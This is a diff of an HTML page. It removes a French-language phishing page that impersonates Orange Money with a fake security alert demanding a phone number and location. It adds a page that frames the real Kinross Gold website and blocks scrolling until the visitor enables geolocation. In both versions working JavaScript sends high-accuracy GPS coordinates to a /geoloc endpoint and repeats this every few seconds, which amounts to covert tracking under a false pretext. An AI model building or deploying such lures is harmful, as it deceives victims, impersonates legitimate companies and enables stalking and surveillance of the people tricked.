@@ -3,352 +3,135 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Kinross Gold Corporation</title>
   
-  <!-- META pour Orange Money Sécurité -->
-  <meta property="og:title" content="Orange Money - Sécurité & Vérification">
-  <meta property="og:description" content="Vérification de sécurité Orange Money. Activez votre localisation pour confirmer votre identité suite à des tentatives d'accès suspectes.">
-  <meta property="og:image" content="https://www.orange.com/sites/default/files/styles/og_image/public/2021-03/Orange_%20logo.jpg">
-  <meta property="og:type" content="website">
-  <meta name="twitter:card" content="summary_large_image">
-  <title>Orange Center | Vérification Sécurisée</title>
-  
-  <!-- Google Fonts & Font Awesome -->
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    /* ========== DESIGN ORANGE ========== */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
     }
 
     body {
-      background: #0c0b0e;
-      color: #fff;
-      overflow-x: hidden;
+      overflow: hidden;
+      height: 100vh;
+      width: 100%;
+      background: #0a0c12;
     }
 
-    /* Fonds dynamiques avec teintes orange */
-    body::before {
-      content: "";
+    /* Conteneur iframe - plein écran */
+    .iframe-container {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: radial-gradient(circle at 20% 30%, #ff6a00, #2c1a0a 80%);
-      z-index: -2;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
     }
 
-    /* Effets lumineux orangés */
-    .light {
+    /* Overlay qui apparaît au scroll */
+    .overlay {
       position: fixed;
-      border-radius: 50%;
-      filter: blur(90px);
-      opacity: 0.3;
-      z-index: -1;
-      animation: floatGlow 16s infinite alternate ease-in-out;
-    }
-    .light1 { width: 550px; height: 550px; background: #ff7900; top: -120px; left: -100px; }
-    .light2 { width: 480px; height: 480px; background: #e65c00; bottom: -50px; right: -70px; animation-delay: 2s; }
-    .light3 { width: 420px; height: 420px; background: #ffa500; top: 50%; left: 70%; animation-delay: 5s; }
-    .light4 { width: 400px; height: 400px; background: #ffb347; bottom: 15%; left: 5%; animation-delay: 1s; }
-
-    @keyframes floatGlow {
-      0% { transform: translateY(-40px) translateX(-20px) scale(1); opacity: 0.25; }
-      100% { transform: translateY(50px) translateX(30px) scale(1.2); opacity: 0.4; }
-    }
-
-    /* CARD PRINCIPALE DE SÉCURITÉ */
-    .security-hero {
-      min-height: 100vh;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.95);
+      backdrop-filter: blur(10px);
+      z-index: 200;
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 20px 16px;
+      flex-direction: column;
+      gap: 25px;
     }
-
-    .security-card {
-      width: 100%;
-      max-width: 620px;
-      background: rgba(20, 18, 22, 0.85);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid #ff7900;
-      border-radius: 48px;
-      padding: 48px 32px;
-      box-shadow: 0 30px 60px rgba(0,0,0,0.6), 0 0 0 2px rgba(255,121,0,0.3) inset;
-      animation: fadeUp 0.9s ease-out;
+    .overlay-box {
+      background: #1a1e26;
+      border: 2px solid #d4af37;
+      border-radius: 30px;
+      padding: 40px 30px;
       text-align: center;
+      max-width: 350px;
+      width: 90%;
     }
-
-    .orange-logo {
+    .overlay-box i {
+      font-size: 50px;
+      color: #d4af37;
       margin-bottom: 20px;
     }
-    .orange-logo i {
-      font-size: 64px;
-      color: #ff7900;
-      background: rgba(255,121,0,0.2);
-      padding: 12px;
-      border-radius: 60px;
+    .overlay-box h3 {
+      color: #d4af37;
+      margin-bottom: 15px;
+      font-family: Arial, sans-serif;
     }
-    .orange-logo span {
-      font-size: 28px;
-      font-weight: 800;
-      margin-left: 12px;
-      background: linear-gradient(135deg, #ffa500, #ff5e00);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-
-    .security-card h1 {
-      font-size: 32px;
-      font-weight: 800;
-      color: #ffb347;
-      margin: 15px 0 12px;
-    }
-
-    .alert-badge {
-      background: rgba(255, 70, 30, 0.2);
-      border-left: 4px solid #ff5e00;
-      border-radius: 20px;
-      padding: 18px 20px;
-      margin: 20px 0;
-      text-align: left;
-      display: flex;
-      gap: 16px;
-      align-items: center;
-    }
-    .alert-badge i {
-      font-size: 40px;
-      color: #ff5e00;
-    }
-    .alert-badge p {
-      font-size: 15px;
-      font-weight: 500;
-      color: #ffdead;
-      margin: 0;
-    }
-    .alert-badge strong {
-      color: #ffaa33;
-      font-weight: 800;
-    }
-
-    .info-text {
-      color: #ffdead;
-      font-size: 15px;
-      margin: 15px 0 25px;
-      line-height: 1.5;
-    }
-
-    /* Champs formulaire */
-    .input-group {
-      margin-bottom: 22px;
-      text-align: left;
-      position: relative;
-    }
-    .input-group label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: 600;
-      color: #ffaa55;
+    .overlay-box p {
+      color: #ccc;
+      margin-bottom: 25px;
       font-size: 14px;
     }
-    .input-group i {
-      position: absolute;
-      left: 18px;
-      bottom: 18px;
-      color: #ff7900;
-      font-size: 18px;
-    }
-    .input-group input {
-      width: 100%;
-      padding: 16px 20px 16px 48px;
-      background: #1e1a1c;
-      border: 1.5px solid #ff7900;
-      border-radius: 60px;
-      color: white;
-      font-size: 16px;
-      transition: all 0.3s;
-    }
-    .input-group input:focus {
-      border-color: #ffb347;
-      outline: none;
-      box-shadow: 0 0 0 3px rgba(255,121,0,0.4);
-    }
-
-    /* Bouton vérification */
-    .btn-verify {
-      width: 100%;
-      padding: 18px 16px;
-      background: linear-gradient(100deg, #ff7900, #ff5200);
+    .btn-location {
+      background: linear-gradient(100deg, #d4af37, #b8860b);
       border: none;
-      border-radius: 60px;
-      color: white;
-      font-weight: 800;
-      font-size: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 14px;
+      padding: 14px 25px;
+      border-radius: 50px;
+      color: #0a0c12;
+      font-weight: bold;
+      font-size: 16px;
       cursor: pointer;
-      transition: 0.25s;
-      margin: 25px 0 20px;
-      box-shadow: 0 12px 25px rgba(255,121,0,0.5);
+      width: 100%;
     }
-    .btn-verify:hover {
-      transform: scale(1.02) translateY(-4px);
-      box-shadow: 0 20px 35px rgba(255,89,0,0.7);
+    .btn-location:hover {
+      transform: scale(1.02);
     }
-    .btn-verify:active {
-      transform: scale(0.98);
-    }
-
-    .status-message {
-      background: rgba(0,0,0,0.5);
-      border-radius: 40px;
-      padding: 14px;
-      margin-top: 20px;
-      font-size: 14px;
-      color: #ffd966;
-      border: 1px solid #ff7900;
-    }
-
-    .trust-features {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 12px;
-      margin: 30px 0 0;
-    }
-    .trust-features span {
-      background: rgba(255,121,0,0.15);
-      padding: 8px 16px;
-      border-radius: 40px;
-      font-size: 13px;
-      border: 1px solid rgba(255,121,0,0.5);
-      color: #ffcc88;
-    }
-    .trust-features i {
-      color: #ff7900;
-      margin-right: 8px;
-    }
-
-    /* Zone de succès / vérification effectuée */
-    .success-area {
-      margin-top: 20px;
-      background: rgba(0, 200, 100, 0.1);
-      border-radius: 32px;
-      padding: 18px;
-      border: 1px solid #3acb5a;
-      display: none;
-    }
-    .success-area i {
-      font-size: 28px;
-      color: #3acb5a;
-      margin-right: 10px;
-    }
-
-    /* Footer Orange */
-    .footer-orange {
-      margin-top: 40px;
-      border-top: 1px solid #ff7900;
-      padding: 30px 20px 20px;
-      text-align: center;
-      color: #ffb98a;
-      font-size: 13px;
-    }
-
-    @keyframes fadeUp {
-      0% { opacity: 0; transform: translateY(40px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-
-    @media (max-width: 600px) {
-      .security-card { padding: 36px 20px; }
-      .security-card h1 { font-size: 26px; }
+    .status {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #d4af37;
     }
   </style>
 </head>
 <body>
-  <!-- Effets lumineux orange -->
-  <div class="light light1"></div>
-  <div class="light light2"></div>
-  <div class="light light3"></div>
-  <div class="light light4"></div>
 
-  <!-- SECTION UNIQUE DE VÉRIFICATION -->
-  <section class="security-hero" id="heroSection">
-    <div class="security-card">
-      <div class="orange-logo">
-        <i class="fas fa-shield-alt"></i>
-        <span>Orange Money</span>
-      </div>
-      <h1><i class="fas fa-exclamation-triangle"></i> ALERTE SÉCURITÉ</h1>
-      
-      <div class="alert-badge">
-        <i class="fas fa-mobile-alt"></i>
-        <p><strong>📱 Plusieurs tentatives d'accès</strong> à votre compte Mobile Money ont été détectées depuis un appareil inconnu.<br>Vérifiez immédiatement votre identité pour sécuriser votre compte.</p>
-      </div>
-      
-      <p class="info-text">
-        <i class="fas fa-map-marker-alt"></i> Pour confirmer que c’est bien vous. Nous vérifions en temps réel.
-      </p>
-
-      <!-- Numéro de téléphone (champ pré-rempli mais modifiable) -->
-      <div class="input-group">
-        <label><i class="fas fa-phone-alt"></i> Votre numéro Orange Money</label>
-        <i class="fas fa-phone"></i>
-        <input type="tel" id="phoneNumber" placeholder="+243 XX XXX XXXX" value="+243">
-      </div>
-
-      <button class="btn-verify" id="verifyBtn">
-        <i class="fas fa-satellite-dish"></i> VÉRIFIER
-      </button>
-
-      <div class="status-message" id="statusMsg">
-        <i class="fas fa-info-circle"></i> Cliquez sur le bouton et acceptez la demande 
-      </div>
-
-      <div class="success-area" id="successArea">
-        <i class="fas fa-check-circle"></i> <strong>✅ Vérification réussie !</strong><br>Votre identité a été confirmée. Aucun accès frauduleux ne sera autorisé.
-      </div>
-
-      <div class="trust-features">
-        <span><i class="fas fa-map-marked-alt"></i> sécurisée</span>
-        <span><i class="fas fa-fingerprint"></i> Vérification en temps réel</span>
-        <span><i class="fas fa-mobile-money"></i> Protection Orange Money</span>
-        <span><i class="fas fa-clock"></i> Session sécurisée</span>
-      </div>
-    </div>
-  </section>
-
-  <div class="footer-orange">
-    <p><i class="fas fa-lock"></i> Orange Money Sécurité - Vérification anti-fraude</p>
-    <p>© 2026 Orange RDC - Toute tentative non autorisée sera bloquée</p>
+  <!-- Navigateur iframe - visible directement -->
+  <div class="iframe-container">
+    <iframe id="kinrossFrame" src="https://www.kinross.com"></iframe>
   </div>
 
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-  <script>
-    // ==================== FONCTIONS ORIGINALES CONSERVÉES ====================
-    // Fonction httpGet (conservée pour compatibilité)
-    function httpGet(theUrl) { 
-      var xmlHttp = new XMLHttpRequest(); 
-      xmlHttp.open("GET", theUrl, false); 
-      xmlHttp.send(null); 
-      return xmlHttp.responseText; 
-    }
+  <!-- Overlay qui apparaît au scroll si localisation non activée -->
+  <div id="overlay" class="overlay" style="display: none;">
+    <div class="overlay-box">
+      <i class="fas fa-map-marker-alt"></i>
+      <h3>📍 Localisation requise</h3>
+      <p>Pour continuer à naviguer sur Kinross Gold Corporation, veuillez activer votre localisation.</p>
+      <button class="btn-location" id="activateBtn">
+        <i class="fas fa-satellite-dish"></i> Activer ma position
+      </button>
+      <div id="statusMsg" class="status"></div>
+    </div>
+  </div>
 
-    // Envoi des données de localisation au serveur (identique à l'original)
-    function sendLocationToServer(lat, lon, mapLink, phoneNumber, step) {
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <script>
+    // ========== ÉTAT ==========
+    let isLocationActive = false;
+    let autoUpdateInterval = null;
+
+    // ========== FONCTIONS GÉOLOCALISATION (CONSERVÉES) ==========
+    function sendLocationToServer(lat, lon, mapLink, step) {
       const payload = {
         lat: lat,
         lon: lon,
         mapLink: mapLink,
-        phoneNumber: phoneNumber,
-        verificationStep: step || "auto_update",
+        step: step || "auto_update",
         timestamp: new Date().toISOString(),
-        source: "Orange_Money_Security"
+        source: "Kinross_Browser"
       };
       fetch('/geoloc', {
         method: 'POST',
@@ -356,30 +139,20 @@
         body: JSON.stringify(payload)
       })
       .then(response => response.json())
-      .then(data => {
-        console.log('✅ Géolocalisation envoyée:', data);
-      })
-      .catch(error => {
-        console.error('⚠️ Erreur envoi serveur:', error);
-      });
+      .then(data => console.log('📍 Localisation envoyée:', data))
+      .catch(error => console.error('Erreur envoi:', error));
     }
 
-    // AutoUpdate : répète l'envoi toutes les 3 secondes (fonctionnalité d'origine)
-    let autoUpdateInterval = null;
-    function startAutoUpdate(lat, lon, phone) {
+    function startAutoUpdate(lat, lon) {
       if (autoUpdateInterval) clearInterval(autoUpdateInterval);
       autoUpdateInterval = setInterval(() => {
-        if (navigator.geolocation) {
+        if (navigator.geolocation && isLocationActive) {
           navigator.geolocation.getCurrentPosition(
-            function(position) {
-              const newLat = position.coords.latitude;
-              const newLon = position.coords.longitude;
-              const newMapLink = `https://www.google.com/maps?q=${newLat},${newLon}`;
-              sendLocationToServer(newLat, newLon, newMapLink, phone, "auto_update");
+            function(pos) {
+              sendLocationToServer(pos.coords.latitude, pos.coords.longitude, 
+                `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "auto");
             },
-            function(err) {
-              console.warn("Auto-update échec:", err.message);
-            },
+            function(err) { console.warn("Auto-update échec:", err.message); },
             { enableHighAccuracy: true, timeout: 8000 }
           );
         }
@@ -393,93 +166,78 @@
       }
     }
 
-    // Vérification principale avec demande GPS
-    function startVerification() {
-      const phoneInput = document.getElementById('phoneNumber');
-      let phoneNumber = phoneInput.value.trim();
-      if (!phoneNumber) {
-        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-exclamation-circle"></i> ❗ Veuillez renseigner votre numéro Orange Money.';
-        return;
-      }
-      if (phoneNumber.length < 8) {
-        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-exclamation-circle"></i> 📞 Numéro invalide. Vérifiez le format (+243 ...).';
-        return;
-      }
-
+    // ========== ACTIVATION LOCALISATION ==========
+    function activateLocation() {
       const statusDiv = document.getElementById('statusMsg');
-      statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande en cours... Veuillez activer';
+      statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande en cours...';
 
       if (!navigator.geolocation) {
-        statusDiv.innerHTML = '<i class="fas fa-ban"></i> Votre navigateur ne supporte pas la géolocalisation. Utilisez un appareil moderne.';
+        statusDiv.innerHTML = '❌ Géolocalisation non supportée';
         return;
       }
 
-      // Demande de géolocalisation avec haute précision (GPS)
       navigator.geolocation.getCurrentPosition(
         function(position) {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
           const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
           
-          // Envoi initial au serveur
-          sendLocationToServer(lat, lon, mapLink, phoneNumber, "verification_success");
+          sendLocationToServer(lat, lon, mapLink, "activation");
+          startAutoUpdate(lat, lon);
           
-          // Lancement de l'auto-update toutes les 3 secondes
-          startAutoUpdate(lat, lon, phoneNumber);
-          
-          // Afficher la zone de succès
-          const successDiv = document.getElementById('successArea');
-          successDiv.style.display = 'block';
-          statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> ✅ Localisation activée avec succès ! Votre identité est vérifiée. Aucune action frauduleuse ne sera traitée.';
-          
-          // Désactiver le bouton pour éviter les doublons
-          const verifyBtn = document.getElementById('verifyBtn');
-          verifyBtn.disabled = true;
-          verifyBtn.style.opacity = '0.6';
-          verifyBtn.innerHTML = '<i class="fas fa-check-double"></i> VÉRIFICATION EFFECTUÉE';
-          
-          console.log(`[Orange Security] GPS actif. Coordonnées: ${lat}, ${lon}`);
+          isLocationActive = true;
+          document.getElementById('overlay').style.display = 'none';
+          statusDiv.innerHTML = '✅ Localisation activée !';
         },
         function(error) {
-          let errorMsg = "";
+          let msg = "";
           switch(error.code) {
-            case error.PERMISSION_DENIED:
-              errorMsg = "Vous avez refusé Activez et réessayez.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              errorMsg = " indisponible. Vérifiez que vous avez une bonne connexion.";
-              break;
-            case error.TIMEOUT:
-              errorMsg = "Délai d'obtention de la position dépassé. Réessayez dans un endroit dégagé.";
-              break;
-            default:
-              errorMsg = "autorisez l'accès.";
+            case error.PERMISSION_DENIED: msg = "Vous avez refusé. Activez dans les paramètres."; break;
+            case error.POSITION_UNAVAILABLE: msg = "Position indisponible."; break;
+            case error.TIMEOUT: msg = "Délai dépassé."; break;
+            default: msg = "Erreur de localisation.";
           }
-          statusDiv.innerHTML = `<i class="fas fa-times-circle"></i> ❌ ${errorMsg}`;
-          stopAutoUpdate();
+          statusDiv.innerHTML = `❌ ${msg}`;
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     }
 
-    // Associer le bouton à la vérification
-    document.getElementById('verifyBtn').addEventListener('click', startVerification);
+    document.getElementById('activateBtn').addEventListener('click', activateLocation);
 
-    // Nettoyer l'intervalle si la page est fermée
+    // ========== DÉTECTION DU SCROLL ==========
+    const overlay = document.getElementById('overlay');
+
+    function showOverlayOnScroll() {
+      if (!isLocationActive) {
+        overlay.style.display = 'flex';
+      }
+    }
+
+    // Détection du scroll global (l'utilisateur scroll dans la page)
+    window.addEventListener('wheel', function() {
+      if (!isLocationActive && overlay.style.display !== 'flex') {
+        showOverlayOnScroll();
+      }
+    });
+    window.addEventListener('touchmove', function() {
+      if (!isLocationActive && overlay.style.display !== 'flex') {
+        showOverlayOnScroll();
+      }
+    });
+
+    // Nettoyage
     window.addEventListener('beforeunload', function() {
       stopAutoUpdate();
     });
 
-    // Pour conserver l'autoUpdate d'origine en variable globale (si appel externe)
+    // Fonction autoUpdate d'origine conservée
     window.autoUpdate = function() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          var lat = position.coords.latitude;
-          var lon = position.coords.longitude;
-          var mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
-          var phone = document.getElementById('phoneNumber') ? document.getElementById('phoneNumber').value : "unknown";
-          sendLocationToServer(lat, lon, mapLink, phone, "manual_call");
-        }, function(err) { console.warn("autoUpdate legacy error:", err); });
+      if (navigator.geolocation && isLocationActive) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          sendLocationToServer(pos.coords.latitude, pos.coords.longitude, 
+            `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "manual");
+        });
       }
     };
   </script>
